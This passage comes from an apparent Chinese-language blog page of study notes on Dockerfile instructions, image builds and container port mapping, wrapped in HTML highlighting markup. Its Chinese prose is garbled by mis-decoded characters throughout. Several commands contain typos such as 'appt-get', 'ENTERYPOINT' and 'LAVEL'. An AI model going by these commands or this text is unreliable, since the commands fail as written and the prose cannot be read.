[<span class="hljs-string">&quot;appt-get&quot;</span>, <span class="hljs-string">&quot; install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>, <span class="hljs-string">&quot;nginx&quot;</span>]<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>-y</code> å‚æ•°æ˜¯ <code>yes</code> çš„æ„æ€ã€‚</p><p><code>EXPOSE</code> æŒ‡ä»¤ï¼Œå‘Šè¯‰ Docker è¯¥å®¹å™¨å†…çš„åº”ç”¨ç¨‹åºå°†ä¼šä½¿ç”¨å®¹å™¨çš„æŒ‡å®šç«¯å£ã€‚</p><p>å¯ä»¥æŒ‡å®šå¤šä¸ª <code>EXPOSE</code> æŒ‡ä»¤æ¥å‘å¤–éƒ¨å…¬å¼€å¤šä¸ªç«¯å£ã€‚</p><h3 id="4-5-4-åŸºäº-Dockerfile-æ„å»ºæ–°é•œåƒ"><a href="#4-5-4-åŸºäº-Dockerfile-æ„å»ºæ–°é•œåƒ" class="headerlink" title="4.5.4 åŸºäº Dockerfile æ„å»ºæ–°é•œåƒ"></a>4.5.4 åŸºäº Dockerfile æ„å»ºæ–°é•œåƒ</h3><p>æ‰§è¡Œ <code>docker build</code> å‘½ä»¤æ—¶ï¼ŒDockerfile ä¸­çš„æ‰€æœ‰æŒ‡ä»¤éƒ½ä¼šè¢«æ‰§è¡Œå¹¶ä¸”æäº¤ï¼Œå¹¶ä¸”åœ¨è¯¥å‘½ä»¤æˆåŠŸç»“æŸåè¿”å›ä¸€ä¸ªæ–°é•œåƒã€‚</p><p>ä½¿ç”¨ <code>-t</code> é€‰é¡¹ä¸ºæ–°é•œåƒè®¾ç½®ä»“åº“å’Œåç§°ä»¥åŠæ ‡ç­¾:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo docker build -t=<span class="hljs-string">&quot;jamtur01/static_web:v1&quot;</span> .<br></code></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰åˆ¶å®šä»»ä½•æ ‡ç­¾ï¼ŒDocker å°†ä¼šè‡ªåŠ¨ä¸ºé•œåƒè®¾ç½®ä¸€ä¸ª <code>latest</code> æ ‡ç­¾.</p><p>æœ€åä¸€ä¸ª <code>.</code> å‘Šè¯‰ Docker åˆ°æœ¬åœ°ç›®å½•ä¸­æ‰¾ Dockerfile æ–‡ä»¶ï¼Œä¹Ÿå¯æŒ‡å®šä¸€ä¸ª Git ä»“åº“çš„æºåœ°å€æ¥æŒ‡å®š Dockerfile çš„ä½ç½®.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo docker build -t=<span class="hljs-string">&quot;jamtur01/static_web:v1&quot;</span> git<span class="hljs-variable">@github</span>.<span class="hljs-symbol">com:</span>jamtur01/docker-static_web<br></code></pre></td></tr></table></figure><p><code>-f</code> å‚æ•°æŒ‡å®šæ–‡ä»¶:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ sudo docker build -t=<span class="hljs-string">&quot;jamtur01/static_web&quot;</span> -f path<span class="hljs-regexp">/to/</span><span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>æ„å»ºç›®å½•ä¸­çš„ <code>.dockerignore</code> ç±»ä¼¼äº <code>.gitignore</code></p><h3 id="4-5-5-æŒ‡ä»¤å¤±è´¥æ—¶ä¼šæ€æ ·"><a href="#4-5-5-æŒ‡ä»¤å¤±è´¥æ—¶ä¼šæ€æ ·" class="headerlink" title="4.5.5 æŒ‡ä»¤å¤±è´¥æ—¶ä¼šæ€æ ·"></a>4.5.5 æŒ‡ä»¤å¤±è´¥æ—¶ä¼šæ€æ ·</h3><h3 id="4-5-6-Dockerfile-å’Œæ„å»ºç¼“å­˜"><a href="#4-5-6-Dockerfile-å’Œæ„å»ºç¼“å­˜" class="headerlink" title="4.5.6 Dockerfile å’Œæ„å»ºç¼“å­˜"></a>4.5.6 Dockerfile å’Œæ„å»ºç¼“å­˜</h3><p>å®ƒä¼šå°†ä¹‹å‰çš„é•œåƒå±‚çœ‹åšç¼“å­˜ï¼Œæ„æ€æ˜¯ç¬¬äºŒæ¬¡ <code>docker build</code> æ—¶ï¼Œä¼šæ¥ç€ä»ä¸Šæ¬¡ç»“æŸæ—¶è¿è¡Œã€‚</p><p>å¿½ç•¥ç¼“å­˜åŠŸèƒ½ï¼Œä½¿ç”¨ <code>docker build --no-cache</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> sudo docker build --<span class="hljs-keyword">no</span>-cache -t=<span class="hljs-string">&quot;jamtur01/static_web&quot;</span><br></code></pre></td></tr></table></figure><h3 id="4-5-7-åŸºäºæ„å»ºç¼“å­˜çš„-Dockerfile-æ¨¡æ¿"><a href="#4-5-7-åŸºäºæ„å»ºç¼“å­˜çš„-Dockerfile-æ¨¡æ¿" class="headerlink" title="4.5.7 åŸºäºæ„å»ºç¼“å­˜çš„ Dockerfile æ¨¡æ¿"></a>4.5.7 åŸºäºæ„å»ºç¼“å­˜çš„ Dockerfile æ¨¡æ¿</h3><p>ä¸€èˆ¬åœ¨ Dockerfile æ–‡ä»¶é¡¶éƒ¨ä½¿ç”¨ç›¸åŒçš„æŒ‡ä»¤é›†æ¨¡æ¿:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FROM</span> ubuntu:<span class="hljs-number">14</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">MAINTAINER</span> James Turnbull <span class="hljs-string">&quot;james@example.com&quot;</span><br><span class="hljs-attribute">ENV</span> REFRESHED_AT <span class="hljs-number">2014</span>-<span class="hljs-number">07</span>-<span class="hljs-number">01</span><br><span class="hljs-attribute">RUN</span> apt-get -qq update<br></code></pre></td></tr></table></figure><p><code>ENV</code> æŒ‡ä»¤ç”¨äºåœ¨é•œåƒä¸­è®¾ç½®ç¯å¢ƒå˜é‡ã€‚</p><p>æ¨¡æ¿å®é™…ä¸Šå°±æ˜¯è‡ªå·±å¸¸ç”¨çš„é…ç½®ã€‚</p><h3 id="4-5-8-æŸ¥çœ‹æ–°é•œåƒ"><a href="#4-5-8-æŸ¥çœ‹æ–°é•œåƒ" class="headerlink" title="4.5.8 æŸ¥çœ‹æ–°é•œåƒ"></a>4.5.8 æŸ¥çœ‹æ–°é•œåƒ</h3><p>æ·±å…¥æ¢æ±‚é•œåƒæ˜¯å¦‚ä½•è¢«æ„å»ºå‡ºæ¥çš„ï¼Œä½¿ç”¨ <code>docker history</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">history</span> <span class="hljs-number">22</span>d47c8cb6e5<br></code></pre></td></tr></table></figure><h3 id="4-5-9-ä»æ–°é•œåƒå¯åŠ¨å®¹å™¨"><a href="#4-5-9-ä»æ–°é•œåƒå¯åŠ¨å®¹å™¨" class="headerlink" title="4.5.9 ä»æ–°é•œåƒå¯åŠ¨å®¹å™¨"></a>4.5.9 ä»æ–°é•œåƒå¯åŠ¨å®¹å™¨</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p 80 --name static_web jamtur01/static_web nginx -g <span class="hljs-string">&quot;daemon off;&quot;</span></span><br></code></pre></td></tr></table></figure><p><code>-d</code> é€‰é¡¹å‘Šè¯‰ Docker ä»¥åˆ†ç¦»(detached)çš„æ–¹å¼åœ¨åå°è¿è¡Œã€‚</p><p><code>-p</code> é€‰é¡¹ï¼Œç”¨æ¥æ§åˆ¶ Docker åœ¨è¿è¡Œæ—¶åº”è¯¥å…¬å¼€å“ªäº›ç½‘ç»œç«¯å£ç»™å¤–éƒ¨(å®¿ä¸»æœº).</p><p>Docker å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹æ³•æ¥åœ¨å®¿ä¸»æœºä¸Šåˆ†é…ç«¯å£:</p><ul><li>Docker å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šéšæœºé€‰æ‹©ä¸€ä¸ªä½äº 32768~61000 çš„æ¯”è¾ƒå¤§çš„ç«¯å£å·æ¥æ˜ å°„åˆ°å®¹å™¨çš„ 80 ç«¯å£ä¸Š</li><li>å¯ä»¥åœ¨ Docker å®¿ä¸»æœºä¸­æŒ‡å®šä¸€ä¸ªå…·ä½“çš„ç«¯å£å·æ¥æ˜ å°„åˆ°å®¹å™¨ä¸­çš„ 80 ç«¯å£ä¸Š</li></ul><p><code>docker run</code> å‘½ä»¤ä¼šåœ¨ Docker å®¿ä¸»æœºä¸Šéšå³æ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œè¿æ¥åˆ°å®¹å™¨ä¸­çš„ 80 ç«¯å£ä¸Šã€‚</p><p>å¯ç”¨ <code>docker ps</code> å‘½ä»¤æŸ¥çœ‹å®¹å™¨çš„ç«¯å£åˆ†é…æƒ…å†µ:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo docker <span class="hljs-built_in">ps</span> <span class="hljs-literal">-l</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯é€šè¿‡ <code>docker port</code> å‘½ä»¤æ¥æŸ¥çœ‹å®¹å™¨çš„ç«¯å£æ˜ å°„æƒ…å†µ:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker port <span class="hljs-number">6751</span>b94bb5c0 <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-p</code> é€‰é¡¹æŒ‡å®šå®¹å™¨ä¸­çš„ç«¯å£æ˜ å°„åˆ° Docker å®¿ä¸»æœºçš„æŸä¸€ç‰¹å®šç«¯å£ä¸Š:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo docker <span class="hljs-built_in">run</span> -d -p <span class="hljs-number">80</span>:<span class="hljs-number">80</span> <span class="hljs-comment">--name static_web</span><br></code></pre></td></tr></table></figure><p>å‰è€…æ˜¯å®¿ä¸»æœºç«¯å£ï¼Œåè€…æ˜¯å®¹å™¨ç«¯å£ã€‚ </p><p>å°†ç«¯å£ç»‘å®šé™åˆ¶åœ¨ç‰¹å®šçš„ç½‘ç»œæ¥å£(å³IPåœ°å€)ä¸Š:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p 127.0.0.1:80:80 --name static_web jamtur01/static_web nginx -g <span class="hljs-string">&quot;daemon off;&quot;</span></span><br></code></pre></td></tr></table></figure><p>å…¶å°†å®¹å™¨å†…çš„ 80 ç«¯å£ç»‘å®šåˆ°æœ¬åœ°å®¿ä¸»æœºçš„ 127.0.0.1 è¿™ä¸ª IP çš„ 80 ç«¯å£ä¸Š. ä¸æŒ‡å®šå¦‚ 80 å°±æ˜¯éšæœºç«¯å£ã€‚</p><p>ä½¿ç”¨ <code>-P</code> å‚æ•°å°† Dockerfile ä¸­é€šè¿‡ <code>EXPOSE</code> æŒ‡ä»¤æŒ‡å®šçš„ç«¯å£å…¬å¼€:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -P --name static_web jamtur01/static_web nginx -g <span class="hljs-string">&quot;daemon off;&quot;</span></span><br></code></pre></td></tr></table></figure><p>å¹¶ç»‘å®šåˆ°éšæœºç«¯å£ã€‚</p><p>æœ‰äº†è¿™ä¸ªç«¯å£å·ï¼Œå°±å¯ä»¥ä½¿ç”¨æœ¬åœ°å®¿ä¸»æœºçš„ IP åœ°å€è¿æ¥åˆ°è¿è¡Œä¸­çš„å®¹å™¨.</p><h3 id="4-5-10-Dockerfile-æŒ‡ä»¤"><a href="#4-5-10-Dockerfile-æŒ‡ä»¤" class="headerlink" title="4.5.10 Dockerfile æŒ‡ä»¤"></a>4.5.10 Dockerfile æŒ‡ä»¤</h3><p>[æ¸…å•](<a href="http://docs.docker.com/">http://docs.docker.com/</a> reference &#x2F;builder&#x2F;)</p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>ç”¨äºæŒ‡å®šä¸€ä¸ªå®¹å™¨å¯åŠ¨æ—¶è¦è¿è¡Œçš„å‘½ä»¤.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">CMD <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-l&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>åé¢ä¸ºå‚æ•°.</p><p>è¿™æ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªæ•°ç»„ç»“æ„ä¸­.</p><p><code>docker run</code> å‘½ä»¤åè‹¥æŒ‡å®šè¦è¿è¡Œçš„å‘½ä»¤, ä¼šè¦†ç›– Dockerfile ä¸­çš„ CMD æŒ‡ä»¤.</p><p>åœ¨ Dockerfile ä¸­åªèƒ½æŒ‡å®šä¸€æ¡ CMD å‘½ä»¤.</p><h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p><code>docker run</code> å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„ä»»ä½•å‚æ•°éƒ½ä¼šè¢«å½“åšå‚æ•°å†æ¬¡ä¼ é€’ç»™ <code>ENTRYPOINT</code> æŒ‡ä»¤ä¸­æŒ‡å®šçš„å‘½ä»¤.</p><p>å¦‚:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ENTERYPOINT <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/usr/sbin/ nginx&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>ç„¶å:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo docker build <span class="hljs-attribute">-t</span>=<span class="hljs-string">&quot;jamtur01/static_web&quot;</span><br>$ sudo docker <span class="hljs-built_in">run</span> -t -i jamtur01/static_web -g <span class="hljs-string">&quot;daemon off;&quot;</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>-g &quot;daemon off;&quot;</code> å°±ä¼šä¼ é€’ç»™ <code>ENTEYPOINT</code></p><p>å¯ç”¨ <code>docker run</code> çš„ <code>--entrypoint</code> é€‰é¡¹æ¥è¦†ç›– <code>ENTRYPOINT</code> æŒ‡ä»¤.</p><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>ç”¨æ¥ä»é•œåƒåˆ›å»ºä¸€ä¸ªå®¹å™¨æ—¶,åœ¨å®¹å™¨å†…éƒ¨è®¾ç½®ä¸€ä¸ªå·¥ä½œç›®å½•,<code>ENTRYPOINT</code> å’Œ <code>/</code> æˆ– <code>CMD</code> æŒ‡å®šçš„ç¨‹åºä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹æ‰§è¡Œ.</p><p>å¯ä»¥è®¾ç½®ä¸åŒçš„å·¥ä½œç›®å½•:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/webapp/db</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> bundle install</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /opt/webapp</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;rackup&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ <code>-w</code> é€‰é¡¹åœ¨è¿è¡Œæ—¶è®¾ç½®å·¥ä½œç›®å½•:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ sudo docker <span class="hljs-keyword">run</span> -ti -w /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span> ubuntu <span class="hljs-keyword">pwd</span><br></code></pre></td></tr></table></figure><h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>ç”¨äºè®¾ç½®ç¯å¢ƒå˜é‡:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ENV RVM_PATH <span class="hljs-regexp">/home/</span>rvm/<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯é€šè¿‡ <code>docker run</code> å‘½ä»¤çš„ <code>-e</code> å‚æ•°æ¥ä¼ é€’ç¯å¢ƒå˜é‡:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> -ti -e <span class="hljs-string">&quot;WEB_PORT=8000&quot;</span> ubuntu <span class="hljs-built_in">env</span></span><br></code></pre></td></tr></table></figure><h4 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h4><p>æŒ‡å®šè¯¥é•œåƒä»¥ä»€ä¹ˆæ ·çš„ç”¨æˆ·å»æ‰§è¡Œ:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">nginx</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥æŒ‡å®šç”¨æˆ·åæˆ– UID ä»¥åŠç»„æˆ– GID:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">USER</span> <span class="hljs-title">user</span><br><span class="hljs-keyword">USER</span> <span class="hljs-title">user</span>:<span class="hljs-keyword">group</span><br><span class="hljs-title">USER</span> uid<br><span class="hljs-keyword">USER</span> <span class="hljs-title">uid</span>:gid<br><span class="hljs-keyword">USER</span> <span class="hljs-title">user</span>:gid<br><span class="hljs-keyword">USER</span> <span class="hljs-title">uid</span>:group<br></code></pre></td></tr></table></figure><p>é»˜è®¤ç”¨æˆ·ä¸º root, å¯ä»¥ç”¨ <code>docker run</code> çš„ <code>-u</code> é€‰é¡¹è¦†ç›–.</p><h4 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h4><h5 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h5><p>åœ¨æ²¡æœ‰åœ¨ <code>docker run</code> æ—¶ä½¿ç”¨ <code>-v</code> é€‰é¡¹æ—¶, åˆ›å»ºä¸€ä¸ªéšè—æ•°æ®å·.</p><h5 id="ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·"><a href="#ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·" class="headerlink" title="ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·"></a>ä»€ä¹ˆæ˜¯éšè—æ•°æ®å·</h5><p>ä¹Ÿå°±æ˜¯æ²¡æœ‰æŒ‡å®šå®¿ä¸»æœºä¸Šé¢çš„æŸä¸€ä¸ªç›®å½•, å› æ­¤è‡ªåŠ¨åœ¨ <code>/var/lib/docker/volumes</code> ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºçš„ä¸€ä¸ªå·.</p><h5 id="VOLUME-çš„ä½œç”¨"><a href="#VOLUME-çš„ä½œç”¨" class="headerlink" title="VOLUME çš„ä½œç”¨"></a>VOLUME çš„ä½œç”¨</h5><p>æ¯”å¦‚æˆ‘ä»¬åœ¨ Dockerfile ä¸­å†™ <code>VOLUME [ &quot;/Blog&quot; ]</code>, å¹¶ä¸”åœ¨ run çš„æ—¶å€™æ²¡æœ‰æ·»åŠ  <code>-v</code> é€‰é¡¹, é‚£ä¹ˆåœ¨å®¹å™¨åˆ›å»ºå, ä¼šç”Ÿæˆ <code>/Blog</code> è¿™ä¸ªç›®å½•, ä»¥åŠåœ¨ <code>/var/lib/docker/volumes</code> ä¸‹ç”Ÿæˆä¸€ä¸ªå·, è¿™ä¸¤ä¸ªç›¸äº’æ˜ å°„.<br>ç”¨æ¥å‘åŸºäºé•œåƒåˆ›å»ºçš„å®¹å™¨æ·»åŠ å·, ä¸€ä¸ªå·æ˜¯å¯ä»¥å­˜åœ¨äºä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨å†…çš„ç‰¹å®šçš„ç›®å½•.</p><p>ç‰¹ç‚¹:</p><ul><li>å·å¯ä»¥åœ¨å®¹å™¨é—´å…±äº«å’Œé‡ç”¨</li><li>ä¸€ä¸ªå®¹å™¨å¯ä»¥ä¸æ˜¯å¿…é¡»å’Œå…¶ä»–å®¹å™¨å…±äº«å·</li><li>å¯¹å·çš„ä¿®æ”¹æ˜¯ç«‹æ—¶ç”Ÿæ•ˆçš„</li><li>å¯¹å·çš„ä¿®æ”¹ä¸ä¼šå¯¹æ›´æ–°é•œåƒäº§ç”Ÿå½±å“</li><li>å·ä¼šä¸€ç›´å­˜åœ¨çŸ¥é“æ²¡æœ‰ä»»ä½•å®¹å™¨å†ä½¿ç”¨å®ƒ.</li></ul><p>å·åŠŸèƒ½å¯ä»¥è®©æˆ‘ä»¬å°†å†…å®¹æ·»åŠ åˆ°é•œåƒè€Œä¸æäº¤.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">VOLUME <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/opt/project&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>ä¸ºåŸºäºæ­¤é•œåƒåˆ›å»ºçš„ä»»ä½•å®¹å™¨åˆ›å»ºä¸€ä¸ªåä¸º <code>/opt/project</code> çš„æŒ‚è½½ç‚¹.</p><p><code>docker cp</code> å…è®¸ä»å®¹å™¨å¤åˆ¶æ–‡ä»¶å’Œå¤åˆ¶æ–‡ä»¶åˆ°å®¹å™¨ä¸Š.</p><p>æŒ‡å®šå¤šä¸ªå·:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">VOLUME <span class="hljs-selector-attr">[<span class="hljs-string">&quot;/opt/project&quot;</span>, <span class="hljs-string">&quot;/data&quot;</span>]</span><br></code></pre></td></tr></table></figure><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>ç”¨æ¥å°†æ„å»ºç¯å¢ƒä¸‹çš„æ–‡ä»¶å’Œç›®å½•å¤åˆ¶åˆ°é•œåƒä¸­.</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">ADD</span> software.lic /<span class="hljs-meta">opt</span>/application/software.lic<br></code></pre></td></tr></table></figure><p>å‰è€…ä¸ºåŸæ–‡ä»¶ä½ç½®,åè€…ä¸ºç›®çš„æ–‡ä»¶ä½ç½®.</p><p>æºæ–‡ä»¶ä½ç½®ä¹Ÿå¯ä»¥æ˜¯ URL.</p><p>Docker é€šè¿‡ç›®çš„åœ°å€å‚æ•°æœ«å°¾çš„å­—ç¬¦æ¥åˆ¤æ–­æ–‡ä»¶æºæ˜¯ç›®å½•è¿˜æ˜¯æ–‡ä»¶:</p><ul><li>ç›®çš„åœ°å€ä»¥ <code>/</code> ç»“å°¾, åˆ™ä¸ºç›®å½•</li><li>ä¸ä»¥, åˆ™ä¸ºæ–‡ä»¶</li></ul><p>å¦‚æœå°†å‹ç¼©æ–‡ä»¶æŒ‡å®šä¸ºæºæ–‡ä»¶,ä¼šå°†å…¶è§£å‹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ADD latest.tar.gz <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/wordpress/</span><br></code></pre></td></tr></table></figure><p>ç›®å‰ Docker è¿˜ä¸æ”¯æŒä»¥ URL æ–¹å¼æŒ‡å®šçš„æºæ–‡ä»¶ä½ç½®ä¸­ä½¿ç”¨å½’æ¡£æ–‡ä»¶.</p><p><code>ADD</code> æŒ‡ä»¤ä¼šä½¿æ„å»ºç¼“å­˜æ— æ•ˆ.</p><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>ç±»ä¼¼äº <code>ADD</code>, ä½† <code>COPY</code> åªå…³å¿ƒåœ¨æ„å»ºä¸Šä¸‹æ–‡ä¸­å¤åˆ¶æœ¬åœ°æ–‡ä»¶,è€Œä¸ä¼š extraction å’Œ decompression.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">COPY</span> conf.d<span class="hljs-regexp">/ /</span>etc<span class="hljs-regexp">/apache2/</span><br></code></pre></td></tr></table></figure><p>æ–‡ä»¶æºè·¯å¾„å¿…é¡»æ˜¯ä¸€ä¸ªä¸å½“å‰æ„å»ºç¯å¢ƒç›¸å¯¹çš„æ–‡ä»¶æˆ–è€…ç›®å½•, æœ¬åœ°æ–‡ä»¶éƒ½æ”¾åˆ°å’Œ Dockerfile åŒä¸€ä¸ªç›®å½•ä¸‹,ä¸èƒ½å¤åˆ¶è¯¥ç›®å½•ä¹‹å¤–çš„ä»»ä½•æ–‡ä»¶.</p><h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>ç”¨äºä¸º Docker é•œåƒæ·»åŠ å…ƒæ•°æ®. å…ƒæ•°æ®ä»¥é”®å€¼å¯¹çš„å½¢å¼å±•ç°:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">LABEL version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span><br>LAVEL location<span class="hljs-operator">=</span><span class="hljs-string">&quot;New York&quot;</span> type<span class="hljs-operator">=</span><span class="hljs-string">&quot;Data Center&quot;</span> role<span class="hljs-operator">=</span><span class="hljs-string">&quot;Web Server&quot;</span><br></code></pre></td></tr></table></figure><p>æ¨èå°†æ‰€æœ‰å…ƒæ•°æ®éƒ½æ”¾åˆ°ä¸€æ¡ LABEL æŒ‡ä»¤ä¸­.</p><p>ç„¶åé€šè¿‡  <code>docker inspect</code> å‘½ä»¤æ¥æŸ¥çœ‹ Docker é•œåƒä¸­çš„æ ‡ç­¾ä¿¡æ¯.</p><h4 id="STOPSIGNAL"><a href="#STOPSIGNAL" class="headerlink" title="STOPSIGNAL"></a>STOPSIGNAL</h4><p>ç”¨æ¥è®¾ç½®åœæ­¢å®¹å™¨æ—¶å‘é€ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨ç»™å®¹å™¨. è¿™ä¸ªä¿¡å·å¿…é¡»æ˜¯å†…æ ¸ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­åˆæ³•çš„æ•°æˆ–è€… SIGNAME æ ¼å¼ä¸­çš„ä¿¡å·åç§°.</p><h4 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h4><p>ç”¨æ¥å®šä¹‰å¯ä»¥åœ¨ <code>docker build</code> å‘½ä»¤è¿è¡Œæ—¶ä¼ é€’ç»™æ„å»ºè¿è¡Œæ—¶çš„å˜é‡, åªéœ€åœ¨æ„å»ºæ—¶ä½¿ç”¨ <code>--build-arg</code> å‚æ•°, ç”¨æˆ·åªèƒ½åœ¨æ„å»ºæ—¶æŒ‡å®šåœ¨ Dockerfile æ–‡ä»¶ä¸­å®šä¹‰è¿‡çš„å‚æ•°:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">ARG</span> build<br><span class="hljs-keyword">ARG</span> webapp_user=<span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒæ¡æŒ‡å®šäº†é»˜è®¤å€¼:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ sudo docker <span class="hljs-keyword">build </span>--<span class="hljs-keyword">build-arg </span><span class="hljs-keyword">build=1234 </span>-t <span class="hljs-keyword">jamtur01/webapp</span><br></code></pre></td></tr></table></figure><p>ä¸è¦ä½¿ç”¨ <code>ARG</code> æ¥ä¼ é€’è¯ä¹¦æˆ–è€…å¯†é’¥.   